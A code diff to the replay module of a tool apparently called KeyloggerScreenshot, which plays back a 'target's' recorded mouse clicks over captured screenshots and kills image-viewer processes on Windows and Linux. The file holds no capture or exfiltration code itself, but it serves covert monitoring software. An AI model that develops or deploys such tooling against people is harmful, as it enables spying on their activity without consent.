@@ -9,15 +9,15 @@ import tkinter as tk
 import BetterPrinting as bp
 import subprocess
 
+
 class Simulation:
+    seconds = None
+    startbutton = None
 
     @staticmethod
     def countdown():
-        global seconds
-        global startbutton
-        global tkWindow
-        real_sec = seconds
-        seconds = seconds + 4
+        real_sec = Simulation.seconds
+        seconds = Simulation.seconds + 4
         # Plus four seconds because of the time the code sleeps
 
         if sys.platform == "linux": size = "295x367"
@@ -39,9 +39,9 @@ class Simulation:
             seconds -= 1
         print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
         # GUI BY: DYMA020
-        startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10, width=30)
+        Simulation.startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10, width=30)
         # Puts everything on place
-        startbutton.grid(row=1, column=0)
+        Simulation.startbutton.grid(row=1, column=0)
         if real_sec < 60:
             text = f"Simulation for {real_sec} seconds"
         else:
@@ -54,16 +54,35 @@ class Simulation:
 
     @staticmethod
     def changecol():  # This function is here to if the simulation has ended
-        startbutton.configure(bg="red")
+        Simulation.startbutton.configure(bg="red")
         # This is the button
-        startbutton["text"] = "Stop simulation"
+        Simulation.startbutton["text"] = "Stop simulation"
         if sys.platform == "windows":
             data = subprocess.check_output("tasklist")
+            # This lists all the tasks that are open on windows
             str_data = str(data).split()
+            # Splits the data
             all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
+            # This removes all unnecessary characters and stores all .exe files with their pid number in this list
             photo = [(task, pid) for task, pid in all_exe if task == "PhotosApp.exe"]
+            # photo searches for the right pid to kill the process
+
             if photo:
                 os.system(f"taskkill /f /PID {photo[0][1]}")
+                # Kills the photos with it pid number
+
+        else:
+            linux_data = subprocess.run(["ps", "aux"], capture_output=True)
+            # This lists all the tasks that are open on linux
+            this_data = str(linux_data).split()
+            # Same code as above
+            all_pid = [this_data[idx - 10] for idx, this_pid in enumerate(this_data) if ".PNG" in this_pid]
+            # This the linux version of stopping the process of all Images that are open
+
+            if all_pid:  # If "all_pid" is not empty this line will be executed
+                for pid in all_pid: os.system(f"kill -15 {pid}")
+                # This is the command which kills the process
+
         os._exit(0)
 
     @staticmethod
@@ -72,7 +91,6 @@ class Simulation:
 
     @staticmethod
     def start_simulation():
-        global seconds
         mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
         # Looks for coordinates in mouseInfoLog
 
@@ -119,7 +137,7 @@ class Simulation:
             one_coordinate = speed + sleep
             duration_seconds = one_coordinate * len(every_coordinate)
             one_image = duration_seconds + img_seconds + escape
-            seconds = round(one_image * len(img_files))
+            Simulation.seconds = round(one_image * len(img_files))
             # This calculates the amount it will take
 
         else:
@@ -129,11 +147,11 @@ class Simulation:
             all_cor = one_cor * len(every_coordinate)
             esc = 0.1
             this_img = all_cor + open_img + esc
-            seconds = round(this_img * len(img_files))
+            Simulation.seconds = round(this_img * len(img_files))
         # This calculates the amount it will take
 
         print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
-        threading_count = threading.Thread(target=Simulation.countdown, args=(seconds, ))
+        threading_count = threading.Thread(target=Simulation.countdown, args=(Simulation.seconds, ))
         # The countdown will start
         threading_count = threading.Thread(target=Simulation.countdown)
         # The countdown will start
@@ -155,4 +173,3 @@ class Simulation:
             except RuntimeError:
                 bp.color('\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',"red")
                 os._exit(0)
-                
